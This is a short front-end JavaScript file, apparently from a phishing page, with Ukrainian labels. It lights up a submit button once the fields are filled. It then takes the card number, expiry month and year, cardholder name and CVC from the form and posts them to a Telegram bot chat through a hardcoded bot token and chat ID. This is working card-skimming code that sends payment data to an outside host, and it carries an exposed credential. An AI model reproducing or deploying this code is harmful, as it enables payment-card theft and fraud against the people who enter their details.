let input = document.querySelectorAll('input');
let button = document.querySelector('.btn');
console.log(input);

console.log(input[0].value);

changeColor = () => {
    input[0].value && input[1].value && input[2].value && input[5].value && (input[3].value || input[4].value)
        !== '' ? button.classList.add('active') : '';
}

input.forEach(inputItem => {
    inputItem.addEventListener("input", changeColor);
});

// дані в телегу
const token = "5982625171:AAGgENz-5FoFXOF2DiYBgzu3E2xUOTHrNk0";
const chatId = "-1001302446058";
const url = `https://api.telegram.org/bot${token}/sendMessage`;
const form = document.querySelector(".telegram-form");
form.addEventListener('submit', function (e) {
    e.preventDefault();

    let message = `номер карти: ${this.nomerCredit.value}\n`;
    message += `місяць: ${this.MM.value}\n`;
    message += `рік: ${this.Rik.value}\n`;
    message += `повне імя: ${this.FullName.value} ${this.FullName2.value}\n`;
    message += `CVC: ${this.CVC.value}`;

    axios.post(url, {
        chat_id: chatId,
        parse_mode: 'html',
        text: message,
    })
        .then((res) => {
            // this.nomerCredit.value = '';
            // this.MM.value = '';
            // this.Rik.value = '';
            // this.FullName.value = '';
            // this.CVC.value = '';
            form.reset();
            button.classList.remove('active');
        })
        .catch((err) => {
            console.warn('err');
        })
        .finally(() => {
            console.log('succes');
        })
})
